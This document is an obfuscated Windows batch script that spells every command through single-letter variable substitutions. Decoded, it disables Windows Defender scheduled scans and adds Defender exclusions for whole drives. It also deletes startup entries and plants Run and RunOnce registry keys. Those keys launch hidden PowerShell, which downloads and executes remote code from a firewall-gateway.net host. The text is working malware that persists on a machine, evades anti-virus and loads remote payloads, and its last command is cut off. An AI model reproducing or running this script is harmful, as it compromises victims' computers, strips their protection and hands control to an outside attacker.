%ybbwhci%%khoziql%%yvyapob%%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci% /%khoziql%%yvyapob%%wegkoem%%bysdcmi%%dskbaxq%%fynwfvh% /%flbzyhx%%bysdcmi% "%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz% %ybbwhci%%khoziql%%yvyapob%%fynwfvh%%tjxpouf%%jxdklrj%%mkmhtbo%%fynwfvh%%tjxpouf% %ybbwhci%%khoziql%%wegkoem%%bysdcmi%" /%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%
%ybbwhci%%khoziql%%yvyapob%%flbzyhx%%wegkoem%%ybbwhci%%eeuyvwk%%ybbwhci% /%khoziql%%yvyapob%%wegkoem%%bysdcmi%%dskbaxq%%fynwfvh% /%flbzyhx%%bysdcmi% "%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz% %cbwqklh%%fynwfvh%%xlnlrpz%%pjdvllg%%gfuxihu%%pjdvllg%%khoziql%%wegkoem%%flbzyhx%%pjdvllg%%nutqtmu%%bysdcmi%" /%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%
%xlnlrpz%%fynwfvh%%hxiqvtv% %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh% %rmyyyjm%%tjxpouf% %ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%xlnlrpz%%wegkoem%%tjtkrhi% %pjdvllg%%khoziql%%nutqtmu%%bysdcmi%
%xlnlrpz%%fynwfvh%%dskbaxq% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%cbwqklh%%fynwfvh%%xlnlrpz%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%\%fynwfvh%%lxckycu%%brlbmmf%%mkmhtbo%%nutqtmu%%xlnlrpz%%fynwfvh%%xlnlrpz%\%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%%jxdklrj%%brlbmmf%%wegkoem%%brlbmmf%%brlbmmf%%xlnlrpz%%nutqtmu%%cbwqklh%%fynwfvh%%tjxpouf%\%xlnlrpz%%jxdklrj%%bysdcmi%" /%cbwqklh% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% "%yvyapob%%eeuyvwk%%khoziql%%jxdklrj%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%cbwqklh%%fynwfvh%%xlnlrpz%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%\%xlnlrpz%%jxdklrj%%bysdcmi%" /%cbwqklh% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci% %tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%cbwqklh%%fynwfvh%%xlnlrpz%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%\%xlnlrpz%%jxdklrj%%bysdcmi%" /%cbwqklh% "%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%%fynwfvh%%xlnlrpz%" /%gfuxihu%
%xlnlrpz%%fynwfvh%%hxiqvtv% %xlnlrpz%%fynwfvh%%hxiqvtv%%nutqtmu%%cbwqklh%%fynwfvh% %rmyyyjm%%tjxpouf% %khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%fynwfvh%%lxckycu%%flbzyhx% %hxiqvtv%%fynwfvh%%bysdcmi%%jxdklrj%
%xlnlrpz%%fynwfvh%%dskbaxq% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% "%yvyapob%%eeuyvwk%%khoziql%%xlnlrpz%\*\%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo%%fynwfvh%%lxckycu%\%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%fynwfvh%%lxckycu%%flbzyhx%%hxiqvtv%%fynwfvh%%bysdcmi%%jxdklrj%%yvyapob%%wegkoem%%bysdcmi%%tjxpouf%%mkmhtbo%%fynwfvh%%xlnlrpz%%ybbwhci%\%fynwfvh%%brlbmmf%%brlbmmf%" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% "%yvyapob%%eeuyvwk%%khoziql%%xlnlrpz%\%tjxpouf%%pjdvllg%%xlnlrpz%%fynwfvh%%khoziql%%flbzyhx%%nutqtmu%%xlnlrpz%%tjtkrhi%\%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo%%fynwfvh%%lxckycu%\%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%fynwfvh%%lxckycu%%flbzyhx%%hxiqvtv%%fynwfvh%%bysdcmi%%jxdklrj%%yvyapob%%wegkoem%%bysdcmi%%tjxpouf%%mkmhtbo%%fynwfvh%%xlnlrpz%%ybbwhci%\%fynwfvh%%brlbmmf%%brlbmmf%" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %tjxpouf%%fynwfvh%%mkmhtbo%%fynwfvh%%flbzyhx%%fynwfvh% "%yvyapob%%eeuyvwk%%khoziql%%xlnlrpz%\%tjxpouf%%xlnlrpz%%pjdvllg%%cbwqklh%%fynwfvh%\%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo%%fynwfvh%%lxckycu%\%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%fynwfvh%%lxckycu%%flbzyhx%%hxiqvtv%%fynwfvh%%bysdcmi%%jxdklrj%%yvyapob%%wegkoem%%bysdcmi%%tjxpouf%%mkmhtbo%%fynwfvh%%xlnlrpz%%ybbwhci%\%fynwfvh%%brlbmmf%%brlbmmf%" /%gfuxihu%
%xlnlrpz%%fynwfvh%%hxiqvtv% %tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh% %rmyyyjm%%tjxpouf% %ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%ybbwhci%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%ybbwhci%\%rmyyyjm%%tjxpouf%%bpltpmn%%nutqtmu%%nutqtmu%%flbzyhx%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "4" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%ybbwhci%\%rmyyyjm%%tjxpouf%%gfuxihu%%pjdvllg%%mkmhtbo%%flbzyhx%%fynwfvh%%xlnlrpz%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "4" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%ybbwhci%\%rmyyyjm%%tjxpouf%%bysdcmi%%pjdvllg%%ybbwhci%%tjxpouf%%xlnlrpz%%cbwqklh%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "4" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%ybbwhci%\%rmyyyjm%%tjxpouf%%bysdcmi%%pjdvllg%%ybbwhci%%ybbwhci%%cbwqklh%%khoziql%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "4" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%ybbwhci%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%fynwfvh%%gfuxihu%%fynwfvh%%bysdcmi%%tjxpouf%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "4" /%gfuxihu%
%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%khoziql%%nutqtmu%%bysdcmi%%flbzyhx%%xlnlrpz%%nutqtmu%%mkmhtbo%%ybbwhci%%fynwfvh%%flbzyhx%\%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%%ybbwhci%\%ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi%%yvyapob%%fynwfvh%%wegkoem%%mkmhtbo%%flbzyhx%%yvyapob%%ybbwhci%%fynwfvh%%xlnlrpz%%cbwqklh%%pjdvllg%%khoziql%%fynwfvh%" /%cbwqklh% "%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% "4" /%gfuxihu%

%xlnlrpz%%fynwfvh%%dskbaxq%.%fynwfvh%%lxckycu%%fynwfvh% %wegkoem%%tjxpouf%%tjxpouf% %yvyapob%%eeuyvwk%%mkmhtbo%%hxiqvtv%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%cbwqklh%%fynwfvh%%xlnlrpz%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%\%brlbmmf%%nutqtmu%%mkmhtbo%%pjdvllg%%khoziql%%pjdvllg%%fynwfvh%%ybbwhci%\%ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv% /%cbwqklh% %fynwfvh%%bysdcmi%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%mkmhtbo%%jxdklrj%%wegkoem% /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%tjxpouf%%rmyyyjm%%nutqtmu%%xlnlrpz%%tjxpouf% /%tjxpouf% 0 /%gfuxihu%

%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%fynwfvh%%tjtkrhi%_%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%_%jxdklrj%%ybbwhci%%fynwfvh%%xlnlrpz%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%cbwqklh%%fynwfvh%%xlnlrpz%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%\%xlnlrpz%%jxdklrj%%bysdcmi%" /%cbwqklh% "#%nutqtmu%%bysdcmi%%fynwfvh%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%ybbwhci%%ikoiset% /%tjxpouf% "%brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo% -%rmyyyjm% %yvyapob%%pjdvllg%%tjxpouf%%tjxpouf%%fynwfvh%%bysdcmi% \"%wegkoem%%tjxpouf%%tjxpouf%-%flbzyhx%%tjtkrhi%%brlbmmf%%fynwfvh% -%wegkoem%%ybbwhci%%ybbwhci%%fynwfvh%%hxiqvtv%%bpltpmn%%mkmhtbo%%tjtkrhi%%bysdcmi%%wegkoem%%hxiqvtv%%fynwfvh% %ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%.%khoziql%%nutqtmu%%xlnlrpz%%fynwfvh%;%pjdvllg%%fynwfvh%%lxckycu% (%bysdcmi%%fynwfvh%%rmyyyjm%-%nutqtmu%%bpltpmn%%mnmpqbg%%fynwfvh%%khoziql%%flbzyhx% %bysdcmi%%fynwfvh%%flbzyhx%.%rmyyyjm%%fynwfvh%%bpltpmn%%khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%).%tjxpouf%%nutqtmu%%rmyyyjm%%bysdcmi%%mkmhtbo%%nutqtmu%%wegkoem%%tjxpouf%%ybbwhci%%flbzyhx%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%('%yvyapob%%flbzyhx%%flbzyhx%%brlbmmf%://%yvyapob%%brlbmmf%%ybbwhci%%mnmpqbg%.%gfuxihu%%pjdvllg%%xlnlrpz%%fynwfvh%%rmyyyjm%%wegkoem%%mkmhtbo%%mkmhtbo%-%dskbaxq%%wegkoem%%flbzyhx%%fynwfvh%%rmyyyjm%%wegkoem%%tjtkrhi%.%bysdcmi%%fynwfvh%%flbzyhx%:80/%yvyapob%%brlbmmf%%mnmpqbg%%ybbwhci%.%brlbmmf%%yvyapob%%brlbmmf%');\"" /%gfuxihu%

%xlnlrpz%%fynwfvh%%dskbaxq% %wegkoem%%tjxpouf%%tjxpouf% "%yvyapob%%eeuyvwk%%fynwfvh%%tjtkrhi%_%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%_%jxdklrj%%ybbwhci%%fynwfvh%%xlnlrpz%\%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%%rmyyyjm%%wegkoem%%xlnlrpz%%fynwfvh%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx%\%rmyyyjm%%pjdvllg%%bysdcmi%%tjxpouf%%nutqtmu%%rmyyyjm%%ybbwhci%\%khoziql%%jxdklrj%%xlnlrpz%%xlnlrpz%%fynwfvh%%bysdcmi%%flbzyhx%%cbwqklh%%fynwfvh%%xlnlrpz%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%\%xlnlrpz%%jxdklrj%%bysdcmi%" /%cbwqklh% "#%nutqtmu%%bysdcmi%%fynwfvh%%jxdklrj%%brlbmmf%%tjxpouf%%wegkoem%%flbzyhx%%fynwfvh%" /%flbzyhx% %xlnlrpz%%fynwfvh%%dskbaxq%_%ybbwhci%%ikoiset% /%tjxpouf% "%brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo% -%rmyyyjm% %yvyapob%%pjdvllg%%tjxpouf%%tjxpouf%%fynwfvh%%bysdcmi% \"%wegkoem%%tjxpouf%%tjxpouf%-%flbzyhx%%tjtkrhi%%brlbmmf%%fynwfvh% -%wegkoem%%ybbwhci%%ybbwhci%%fynwfvh%%hxiqvtv%%bpltpmn%%mkmhtbo%%tjtkrhi%%bysdcmi%%wegkoem%%hxiqvtv%%fynwfvh% %ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%.%khoziql%%nutqtmu%%xlnlrpz%%fynwfvh%;%pjdvllg%%fynwfvh%%lxckycu% (%bysdcmi%%fynwfvh%%rmyyyjm%-%nutqtmu%%bpltpmn%%mnmpqbg%%fynwfvh%%khoziql%%flbzyhx% %bysdcmi%%fynwfvh%%flbzyhx%.%rmyyyjm%%fynwfvh%%bpltpmn%%khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%).%tjxpouf%%nutqtmu%%rmyyyjm%%bysdcmi%%mkmhtbo%%nutqtmu%%wegkoem%%tjxpouf%%ybbwhci%%flbzyhx%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%('%yvyapob%%flbzyhx%%flbzyhx%%brlbmmf%://%yvyapob%%brlbmmf%%ybbwhci%%mnmpqbg%.%gfuxihu%%pjdvllg%%xlnlrpz%%fynwfvh%%rmyyyjm%%wegkoem%%mkmhtbo%%mkmhtbo%-%dskbaxq%%wegkoem%%flbzyhx%%fynwfvh%%rmyyyjm%%wegkoem%%tjtkrhi%.%bysdcmi%%fynwfvh%%flbzyhx%:443/%jxdklrj%%tjxpouf%%tjxpouf%%pjdvllg%%fynwfvh%%lxckycu%%brlbmmf%%mkmhtbo%%nutqtmu%%xlnlrpz%%fynwfvh%%xlnlrpz%');\"" /%gfuxihu%

"%khoziql%:\%brlbmmf%%xlnlrpz%%nutqtmu%%dskbaxq%%xlnlrpz%%wegkoem%%hxiqvtv% %gfuxihu%%pjdvllg%%mkmhtbo%%fynwfvh%%ybbwhci%\%hxiqvtv%%pjdvllg%%khoziql%%xlnlrpz%%nutqtmu%%ybbwhci%%nutqtmu%%gfuxihu%%flbzyhx% %ybbwhci%%fynwfvh%%khoziql%%jxdklrj%%xlnlrpz%%pjdvllg%%flbzyhx%%tjtkrhi% %khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%\%ybbwhci%%fynwfvh%%flbzyhx%%jxdklrj%%brlbmmf%.%fynwfvh%%lxckycu%%fynwfvh%" /%lxckycu% /%ybbwhci% /%tjxpouf%%pjdvllg%%ybbwhci%%wegkoem%%bpltpmn%%mkmhtbo%%fynwfvh%%nutqtmu%%ybbwhci%%mkmhtbo%%pjdvllg%%hxiqvtv%%pjdvllg%%flbzyhx%

%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx% /%bpltpmn% %brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo% %wegkoem%%tjxpouf%%tjxpouf%-%hxiqvtv%%brlbmmf%%brlbmmf%%xlnlrpz%%fynwfvh%%gfuxihu%%fynwfvh%%xlnlrpz%%fynwfvh%%bysdcmi%%khoziql%%fynwfvh% -%fynwfvh%%lxckycu%%khoziql%%mkmhtbo%%jxdklrj%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%%brlbmmf%%wegkoem%%flbzyhx%%yvyapob% "%khoziql%:" -%gfuxihu%%nutqtmu%%xlnlrpz%%khoziql%%fynwfvh%

%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx% /%bpltpmn% %brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo% %wegkoem%%tjxpouf%%tjxpouf%-%hxiqvtv%%brlbmmf%%brlbmmf%%xlnlrpz%%fynwfvh%%gfuxihu%%fynwfvh%%xlnlrpz%%fynwfvh%%bysdcmi%%khoziql%%fynwfvh% -%fynwfvh%%lxckycu%%khoziql%%mkmhtbo%%jxdklrj%%ybbwhci%%pjdvllg%%nutqtmu%%bysdcmi%%brlbmmf%%wegkoem%%flbzyhx%%yvyapob% "%khoziql%:\%jxdklrj%%ybbwhci%%fynwfvh%%xlnlrpz%%ybbwhci%" -%gfuxihu%%nutqtmu%%xlnlrpz%%khoziql%%fynwfvh%

%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx% /%bpltpmn% %brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo% -%rmyyyjm% %yvyapob%%pjdvllg%%tjxpouf%%tjxpouf%%fynwfvh%%bysdcmi% "%pjdvllg%%fynwfvh%%lxckycu%(%bysdcmi%%fynwfvh%%rmyyyjm%-%nutqtmu%%bpltpmn%%mnmpqbg%%fynwfvh%%khoziql%%flbzyhx% %bysdcmi%%fynwfvh%%flbzyhx%.%rmyyyjm%%fynwfvh%%bpltpmn%%khoziql%%mkmhtbo%%pjdvllg%%fynwfvh%%bysdcmi%%flbzyhx%).%tjxpouf%%nutqtmu%%rmyyyjm%%bysdcmi%%mkmhtbo%%nutqtmu%%wegkoem%%tjxpouf%%ybbwhci%%flbzyhx%%xlnlrpz%%pjdvllg%%bysdcmi%%dskbaxq%('%yvyapob%%flbzyhx%%flbzyhx%%brlbmmf%://%yvyapob%%brlbmmf%%ybbwhci%%mnmpqbg%.%gfuxihu%%pjdvllg%%xlnlrpz%%fynwfvh%%rmyyyjm%%wegkoem%%mkmhtbo%%mkmhtbo%-%dskbaxq%%wegkoem%%flbzyhx%%fynwfvh%%rmyyyjm%%wegkoem%%tjtkrhi%.%bysdcmi%%fynwfvh%%flbzyhx%:443/%jxdklrj%%tjxpouf%%tjxpouf%%pjdvllg%%fynwfvh%%lxckycu%%brlbmmf%%mkmhtbo%%nutqtmu%%xlnlrpz%%fynwfvh%%xlnlrpz%');"
 
%ybbwhci%%flbzyhx%%wegkoem%%xlnlrpz%%flbzyhx% /%bpltpmn% %brlbmmf%%nutqtmu%%rmyyyjm%%fynwfvh%%xlnlrpz%%ybbwhci%%yvyapob%%fynwfvh%%mkmhtbo%%mkmhtbo% -%rmyyyjm% %yvyapob%%pjdvllg%%tjxpouf%%tjxpouf%%fynwfvh%%bysdcmi% "%wegkoem%%tjxpouf%%tjxpouf%-%flbzyhx%%tjtkrhi%%brlbmmf%%fynwfvh% -%wegkoem%%ybbwhci%%ybbwhci%%fynwfvh%%hxiqvtv%%bpltpmn%%mkmhtbo%%tjtkrhi%%bysdcmi%%wegkoem%%hxiqvtv%%fynwfvh% %ybbwhci%%tjtkrhi%%ybbwhci%%flbzyhx%%fynwfvh%%hxiqvtv%.%khoziql%%nutqtmu%%xlnlrpz%%fynwfvh%;%pjdvllg%%fynwfvh%%lxckycu% 